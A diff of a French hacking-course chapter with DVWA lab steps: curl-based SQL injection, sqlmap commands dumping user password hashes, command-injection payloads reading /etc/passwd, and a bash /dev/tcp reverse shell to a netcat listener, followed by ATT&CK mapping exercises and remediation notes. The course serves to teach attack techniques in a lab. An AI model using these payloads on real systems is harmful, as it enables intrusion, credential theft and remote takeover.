-**Checkpoint A :** Les 5 utilisateurs de la base apparaissent au lieu d'un seul.
-
-### Étape 2 — Automatisation avec sqlmap
+**Comment obtenir le cookie :**
 
 ```bash
-cd ~/cours-hacking/jour-1/labs/
+# Méthode 1 : via curl (si vous avez fait l'étape A.3)
+cat /tmp/dvwa_cookie.txt | grep PHPSESSID
 
-# Remplacer XXXX par votre PHPSESSID (Depuis Firefox → F12 → Storage → Cookies)
-COOKIE="PHPSESSID=XXXX;security=low"
-
-# Étape 2a : Lister les bases de données
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="$COOKIE" --dbs --batch | tee sqlmap_dbs.txt
+# Méthode 2 : via Firefox → F12 → Storage → Cookies → PHPSESSID
+# Méthode 3 : via le vol XSS de l'étape précédente
 ```
 
-**Sortie attendue :**
+### Étape 1 — Test manuel
+
+```bash
+curl -s -b "PHPSESSID=XXXX;security=low" \
+  "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
+  | grep -c "First name"
+# → Doit retourner 5 (5 utilisateurs affichés au lieu d'1 seul)
+```
+
+**Checkpoint A :** La SQLi manuelle affiche 5 utilisateurs.
+
+### Étape 2 — sqlmap : lister les bases
+
+```bash
+cd ~/cours-hacking/jour-1/labs
+
+# Remplacez XXXX par votre PHPSESSID
+sqlmap -u "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  --dbs --batch 2>&1 | tee sqlmap_dbs.txt
+```
+
+Sortie attendue :
 
 ```
 available databases [2]:
@@ -584,10 +599,12 @@ available databases [2]:
 [*] information_schema
 ```
 
+### Étape 3 — sqlmap : lister les tables
+
 ```bash
-# Étape 2b : Lister les tables de la base dvwa
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="$COOKIE" -D dvwa --tables --batch
+sqlmap -u "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  -D dvwa --tables --batch
 ```
 
 ```
@@ -599,24 +616,17 @@ Database: dvwa
 +-----------+
 ```
 
-```bash
-# Étape 2c : Extraire les colonnes de la table users
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="$COOKIE" -D dvwa -T users --columns --batch
-```
+### Étape 4 — sqlmap : dumper les utilisateurs
 
 ```bash
-# Étape 2d : Dumper les mots de passe
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="$COOKIE" -D dvwa -T users -C user,password --dump --batch
+sqlmap -u "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=XXXX;security=low" \
+  -D dvwa -T users -C user,password --dump --batch
 ```
 
-**Sortie attendue :**
+Sortie attendue :
 
 ```
-Database: dvwa
-Table: users
-[5 entries]
 +---------+---------------------------------------------+
 | user    | password                                    |
 +---------+---------------------------------------------+
@@ -630,20 +640,6 @@ Table: users
 
 **Checkpoint B :** 5 utilisateurs extraits avec leurs hashs MD5.
 
-### Étape 3 — Craquer les hashs avec hashcat ou john
-
-```bash
-# Extraire les hashs dans un fichier
-echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
-echo "e99a18c428cb38d5f260853678922e03" >> hashes.txt
-echo "8d3533d75ae2c3966d7e0d4fcc69216b" >> hashes.txt
-echo "0d107d09f5bbe40cade3de5c71e9e9b7" >> hashes.txt
-
-# Craquer avec john (format raw-md5)
-john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
-john --show --format=raw-md5 hashes.txt
-```
-
 ---
 
 ## Lab 1.4 — Command Injection + Reverse Shell
@@ -653,33 +649,34 @@ john --show --format=raw-md5 hashes.txt
 | Propriété | Valeur |
 |---|---|
 | **Durée** | 30 min |
-| **Conteneur** | `dvwa` (port 8080) |
+| **Conteneur** | `dvwa` |
 | **Dossier de travail** | `~/cours-hacking/jour-1/labs/` |
 | **Technique ATT&CK** | T1059.004 Unix Shell → TA0002 Execution |
 
-### Prérequis avant de commencer
+### Prérequis
 
 - [x] DVWA connecté, sécurité **low**
-- [x] Ouvrir un 2e terminal Kali pour l'écouteur netcat
+- [x] Un deuxième terminal Kali prêt pour l'écouteur netcat
+- [x] Votre IP Kali identifiée (`echo $KALI_IP`)
 
 ### Étape 1 — Command injection basique
 
-Dans DVWA → **Command Injection** :
-
-```
-Champ "Enter an IP address" : 127.0.0.1; ls /etc/
-Cliquer "Submit"
-```
-
-**Checkpoint A :** Le résultat de `ping 127.0.0.1` apparaît, suivi de la liste des fichiers dans `/etc/`. La commande `ls /etc/` a bien été injectée.
-
-Testez ces variantes :
-
 ```bash
-127.0.0.1; whoami              # → www-data
-127.0.0.1; cat /etc/passwd     # → liste des utilisateurs
-127.0.0.1; id                  # → uid=33(www-data)
-127.0.0.1; pwd                 # → /var/www/html/vulnerabilities/exec
+# Via curl (pratique en Scénario B sans navigateur)
+curl -s -b "PHPSESSID=XXXX;security=low" \
+  --data-urlencode "ip=127.0.0.1; ls /etc/&Submit=Submit" \
+  "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/exec/" \
+  | head -30
+```
+
+Vous devez voir le contenu de `/etc/` après le résultat du ping.
+
+Variantes à tester :
+
+```
+127.0.0.1; whoami              → www-data
+127.0.0.1; cat /etc/passwd     → liste des utilisateurs
+127.0.0.1; id                  → uid=33(www-data) gid=33(www-data)
 ```
 
 ### Étape 2 — Reverse shell
@@ -691,40 +688,70 @@ nc -lvnp 4444
 # Listening on 0.0.0.0 4444
 ```
 
-**Terminal 2 — DVWA Command Injection :**
-
-Dans le champ IP, injectez un reverse shell. Remplacez `<KALI_IP>` par l'IP de votre machine Kali :
+**Terminal 2 — Envoyer le reverse shell via DVWA :**
 
 ```bash
-; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
+# Remplacez <KALI_IP> par la vraie IP de votre Kali
+# Scénario A : utiliser l'IP docker0 (172.17.0.1) car DVWA est dans Docker
+# Scénario B : utiliser l'IP du conteneur kali-attacker
+
+REVERSE_IP="172.17.0.1"  # Adapter selon votre scénario
+
+curl -s -b "PHPSESSID=XXXX;security=low" \
+  --data-urlencode "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/${REVERSE_IP}/4444 0>&1'&Submit=Submit" \
+  "http://${TARGET_DVWA}:${PORT_DVWA}/vulnerabilities/exec/"
 ```
 
-**Checkpoint B :** Dans le terminal 1, vous obtenez un shell :
+**Checkpoint :** Dans le terminal 1, vous obtenez un shell :
 
 ```
 Connection received on <IP>
-bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: cannot set terminal process group
 bash: no job control in this shell
 www-data@<container_id>:/var/www/html/vulnerabilities/exec$
 ```
 
-### Étape 3 — Post-exploitation dans le shell
+### Étape 3 — Dans le shell
 
 ```bash
 whoami              # www-data
-hostname            # ID du conteneur Docker
+hostname            # ID du conteneur
 pwd                 # /var/www/html/vulnerabilities/exec
-ls -la /var/www/    # Explorer le serveur web
-cat /etc/passwd     # Voir les utilisateurs
+ls -la /var/www/    # Explorer le serveur
 ```
 
-### Nettoyage
+### Résolution du problème d'IP pour le reverse shell
+
+```mermaid
+flowchart TB
+    subgraph SCENARIO_A_RS["Scenario A — Reverse shell IP"]
+        KALI_A["Kali hôte<br/>IP externe : 192.168.x.x<br/>IP bridge : 172.17.0.1"]
+        DVWA_A["Conteneur DVWA"]
+        DVWA_A -->|"Reverse shell → 172.17.0.1:4444"| KALI_A
+    end
+
+    subgraph SCENARIO_B_RS["Scenario B — Reverse shell IP"]
+        KALI_B["kali-attacker<br/>IP Docker : 172.18.0.x"]
+        DVWA_B["dvwa-target<br/>IP Docker : 172.18.0.y"]
+        DVWA_B -->|"Reverse shell → kali-attacker:4444"| KALI_B
+    end
+```
+
+**Scénario A :** Pour le reverse shell depuis un conteneur Docker vers Kali hôte, utilisez l'IP du bridge Docker :
 
 ```bash
-# Dans le shell DVWA
-exit
+# Trouver l'IP docker0
+REVERSE_IP=$(ip addr show docker0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
+echo "Reverse shell IP : $REVERSE_IP"
+# → Typiquement 172.17.0.1
+```
 
-# Sur Kali, Ctrl+C pour fermer netcat
+**Scénario B :** Les conteneurs sont sur le même réseau. Utilisez le nom de service :
+
+```bash
+REVERSE_IP="kali-attacker"
+# ou
+REVERSE_IP=$(hostname -I | awk '{print $1}')
 ```
 
 ---
@@ -733,45 +760,33 @@ exit
 
 ### Exercice 1 : Première couche ATT&CK Navigator
 
-**Énoncé :** Ouvrez ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/) et créez une couche contenant les 5 techniques vues aujourd'hui. Exportez le JSON dans `~/cours-hacking/jour-1/attack_layer_j1.json`.
+**Énoncé :** Ouvrez https://mitre-attack.github.io/attack-navigator/ et créez une couche avec les 5 techniques vues aujourd'hui. Exportez le JSON dans `~/cours-hacking/jour-1/attack_layer_j1.json`.
 
 <details>
 <summary><strong>Solution</strong></summary>
 
 1. Aller sur https://mitre-attack.github.io/attack-navigator/
 2. "Create New Layer" → "Enterprise ATT&CK v15"
-3. Dans la barre de recherche, ajouter une à une :
-   - `T1046` (Network Service Scanning) — couleur 🔵 bleue
-   - `T1189` (Drive-by Compromise) — couleur 🔴 rouge
-   - `T1190` (Exploit Public-Facing App) — couleur 🔴 rouge
-   - `T1059.004` (Unix Shell) — couleur 🔴 rouge
-   - `T1203` (Exploitation for Client Exec) — couleur 🟠 orange
-4. "Download as JSON" → sauver dans `~/cours-hacking/jour-1/attack_layer_j1.json`
+3. Rechercher et ajouter : T1046, T1189, T1190, T1059.004, T1203
+4. Colorer : rouge = testé, bleu = à tester
+5. "Download as JSON" → `~/cours-hacking/jour-1/attack_layer_j1.json`
 </details>
 
 ### Exercice 2 : Mapping d'attaque réelle — WannaCry
 
-**Énoncé :** L'attaque WannaCry (2017) utilisait EternalBlue pour se propager et DoublePulsar comme backdoor. Trouvez les techniques ATT&CK correspondantes.
+**Énoncé :** WannaCry (2017) utilisait EternalBlue. Trouvez les techniques ATT&CK.
 
 <details>
 <summary><strong>Solution</strong></summary>
 
-- **EternalBlue (CVE-2017-0144)** → **T1210 Exploitation of Remote Services**
-  - Tactique : TA0008 Lateral Movement
-  - Exploite SMBv1 sur port 445
-
-- **DoublePulsar** → **T1505.003 Web Shell** ou **T1543.003 Windows Service**
-  - Tactique : TA0003 Persistence
-  - Backdoor kernel-level sur Windows
-
-- **Chiffrement WannaCry** → **T1486 Data Encrypted for Impact**
-  - Tactique : TA0014 Impact
-  - Chiffre les fichiers, demande rançon
+- EternalBlue (CVE-2017-0144) → T1210 Exploitation of Remote Services (TA0008)
+- DoublePulsar → T1543.003 Windows Service (TA0003)
+- Chiffrement → T1486 Data Encrypted for Impact (TA0014)
 </details>
 
-### Exercice 3 : Write-up du Lab DVWA
+### Exercice 3 : Mini-rapport DVWA
 
-**Énoncé :** Rédigez un mini-rapport (20 lignes) décrivant les 4 vulnérabilités exploitées sur DVWA, avec pour chacune : type, technique ATT&CK, impact, remédiation.
+**Énoncé :** Rédigez un mini-rapport (20 lignes) avec les 4 vulnérabilités exploitées, leur technique ATT&CK et leur remédiation.
 
 <details>
 <summary><strong>Solution</strong></summary>
@@ -779,31 +794,25 @@ exit
 ```markdown
 # Mini-Rapport DVWA — Jour 1
 
-## Vulnérabilités identifiées
-
 ### 1. XSS Reflété
-- **Type :** Cross-Site Scripting (Reflected)
-- **ATT&CK :** T1189 Drive-by Compromise
-- **Impact :** Vol de cookie de session, redirection malveillante
-- **Remédiation :** htmlspecialchars(), Content-Security-Policy header
+- ATT&CK : T1189 Drive-by Compromise
+- Impact : Vol de cookie de session
+- Remédiation : htmlspecialchars(), Content-Security-Policy
 
 ### 2. XSS Stocké
-- **Type :** Cross-Site Scripting (Stored)
-- **ATT&CK :** T1189 Drive-by Compromise
-- **Impact :** Tous les visiteurs de la page infectés
-- **Remédiation :** Échappement HTML à l'entrée ET à la sortie
+- ATT&CK : T1189
+- Impact : Tous les visiteurs infectés
+- Remédiation : Échappement HTML entrée + sortie
 
 ### 3. Injection SQL
-- **Type :** SQL Injection (Union-based)
-- **ATT&CK :** T1190 Exploit Public-Facing Application
-- **Impact :** Extraction complète de la base de données
-- **Remédiation :** Requêtes préparées (PDO), validation stricte
+- ATT&CK : T1190 Exploit Public-Facing Application
+- Impact : Extraction complète de la base
+- Remédiation : Requêtes préparées PDO
 
 ### 4. Command Injection
-- **Type :** OS Command Injection
-- **ATT&CK :** T1059.004 Unix Shell
-- **Impact :** Exécution de code arbitraire (reverse shell)
-- **Remédiation :** escapeshellcmd(), liste blanche de commandes
+- ATT&CK : T1059.004 Unix Shell
+- Impact : Exécution de code arbitraire
+- Remédiation : escapeshellcmd(), liste blanche
 ```
 </details>
 
@@ -811,24 +820,23 @@ exit
 
 ## Points clés à retenir
 
-- **MITRE ATT&CK** est votre référentiel : chaque attaque se mappe à une technique (ID Txxxx)
+- **MITRE ATT&CK** est votre référentiel : chaque attaque a un ID Txxxx
 - Les 14 tactiques couvrent le cycle complet d'une cyberattaque
-- Chaque vulnérabilité web a son entrée ATT&CK : XSS → T1189, SQLi → T1190, CSRF → T1203
-- Les outils fondamentaux : nmap (T1046 scan), Metasploit (exploitation), Wireshark (T1040 sniffing)
-- DVWA permet de tester les 4 familles de vulnérabilités web sur un seul conteneur
-- L'environnement Docker garantit la reproductibilité des labs
-- Le cookie de session volé via XSS = Credential Access (T1539) dans la kill chain
-- sqlmap automatise l'extraction de données, mais il faut toujours comprendre la requête sous-jacente
+- XSS → T1189, SQLi → T1190, CSRF → T1203, CMDi → T1059.004
+- nmap (T1046), Metasploit, Wireshark (T1040)
+- DVWA permet de tester 4 familles de vulnérabilités web
+- **Scénario A vs B** : adaptez vos cibles (`localhost:8080` vs `dvwa:80`)
+- Pour les reverse shells depuis Docker vers Kali : utilisez l'IP du bridge `docker0`
 
 ## Pour aller plus loin
 
 - [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
-- [ATT&CK for Enterprise — Full Matrix](https://attack.mitre.org/matrices/enterprise/)
+- [ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
 - [DVWA GitHub](https://github.com/digininja/DVWA)
 - [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
-- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 
 ---
 
-*Chapitre suivant : [Jour 2 — Tests de pénétration et exploitation](./JOUR-02.md)*
-*Hors-Série Agentic : [KillChainAgent — Outil d'attaque orchestré par agents](./HORS-SERIE-AGENTIC.md)*
+*Chapitre suivant : [Jour 2 — Tests de pénétration](./JOUR-02.md)*
+*Hors-Série Agentic : [KillChainAgent](./HORS-SERIE-AGENTIC.md)*
+*Guide Environnement : [ENVIRONNEMENT.md](./ENVIRONNEMENT.md)*
